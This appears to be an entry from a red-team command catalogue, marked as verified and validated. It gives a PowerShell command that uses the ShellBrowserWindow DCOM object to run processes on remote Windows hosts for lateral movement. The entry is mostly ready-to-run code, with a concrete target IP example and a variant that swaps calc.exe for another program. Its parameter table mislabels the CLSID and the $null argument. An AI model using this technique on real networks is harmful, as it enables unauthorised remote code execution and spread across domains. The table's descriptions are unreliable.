---
id: 7694490b-141c-43f5-a89d-c001de8a2001
type: command
executor: powershell
data: >-
  $com =
  [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"$_TARGET_IP")

  $obj = [System.Activator]::CreateInstance($com)

  $obj.Application.ShellExecute("cmd.exe","/c
  calc.exe","C:\windows\system32",$null,0)
output: null
created_at: '2023-04-06T03:56:07.185882+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - dcom
  - lateral-movement
  - remote-execution
verified: true
validated: true
---

# PowerShell DCOM ShellBrowserWindow Execute Calculator

## Command

```powershell
$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"$_TARGET_IP")
$obj = [System.Activator]::CreateInstance($com)
$obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```

## Description

This PowerShell command exploits the ShellBrowserWindow DCOM object to remotely execute the Windows Calculator on a target machine. It is used for lateral movement in Windows domain environments, requiring only domain user credentials. The command creates a remote COM instance and invokes ShellExecute to run calc.exe via cmd.exe.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP address or hostname of the remote Windows target | Yes |
| CLSID 'C08AFD90-F2A1-11D1-8455-00A0C91F3880' | Fixed CLSID for ShellWindows object (do not change) | Built-in |
| cmd.exe /c calc.exe | Command to execute (calc.exe launches calculator) | Built-in |
| C:\windows\system32 | Working directory for execution | Built-in |
| $null | Window style parameter (hidden) | Built-in |
| 0 | Show command parameter (SW_HIDE) | Built-in |

## Examples

### Basic Usage

Execute on a target at 192.168.1.100:

```powershell
$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"192.168.1.100")
$obj = [System.Activator]::CreateInstance($com)
$obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```

### Advanced Usage

To execute a different program (e.g., notepad.exe), modify the ShellExecute arguments:

```powershell
$obj.Application.ShellExecute("cmd.exe","/c notepad.exe","C:\windows\system32",$null,0)
```

## Expected Output

No console output on success; the calculator process starts on the target. Errors include:
- "Cannot find type [Type]::GetTypeFromCLSID": Invalid CLSID or network issue.
- "Access is denied": Insufficient credentials or firewall block.
Verify success by RDP to target and check for calc.exe in Task Manager.

## Related

- [[procedures/dcom-shellbrowserwindow-calculator-execution]]
- [[codes/powershell-dcom-shellbrowserwindow-calculator-payload]]
